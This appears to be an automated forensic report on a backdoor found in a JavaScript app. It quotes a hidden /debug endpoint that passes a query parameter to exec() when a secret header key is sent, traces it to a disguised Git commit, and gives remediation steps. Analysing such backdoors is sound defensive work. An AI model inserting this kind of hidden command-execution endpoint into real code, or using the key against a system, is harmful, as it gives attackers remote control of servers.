# Forensic Investigation Report: Case #002 - Credential Theft & Backdoor

**Date:** 2026-02-05
**Investigator:** DPFF Automated Agent
**Incident Type:** Unauthorized Code Modification (Backdoor)
**Severity:** CRITICAL

## Executive Summary
A backdoor was identified in the application source code (`app.js`), enabling remote code execution via a specific HTTP header. The unauthorized change was traced to a specific Git commit.

## Evidence Analyzed
1.  **File:** `app_backdoored.js` (Source code analysis)
2.  **Log:** `git_log.txt` (Version control history)

## Findings
### 1. Source Code Analysis
The file `app.js` (analyzed as `app_backdoored.js`) contains a suspicious endpoint `/debug`:

```javascript
app.get('/debug', (req, res) => {
    if (req.headers['x-debug-key'] === 'kpoptop') {
        const cmd = req.query.cmd;
        exec(cmd, ...); // Remote Code Execution
    }
    // ...
});
```

 This allows any user with the header `x-debug-key: kpoptop` to execute arbitrary system commands.

### 2. Attribution
Cross-referencing `git_log.txt` reveals the code was introduced in commit `8f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a` by author `mallory@victim-org.com`.

```
commit 8f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a
Author: mallory <mallory@victim-org.com>
Date:   Thu Feb 05 15:00:00 2026 +0000
    fix: update health check logging
```

The commit message "fix: update health check logging" appears to be an attempt to mask the malicious activity.

## Root Cause
- **Compromised User Account:** The commit was signed by 'mallory', suggesting credential theft or insider threat.
- **Bypassed Code Review:** The commit was pushed directly to the branch without a Pull Request approval (inferred from lack of merge commit).

## Recommendations
1.  Revoke access for user 'mallory' pending investigation.
2.  Scan all historical commits for 'kpoptop' string.
3.  Enforce strict branch protection preventing direct pushes to main.
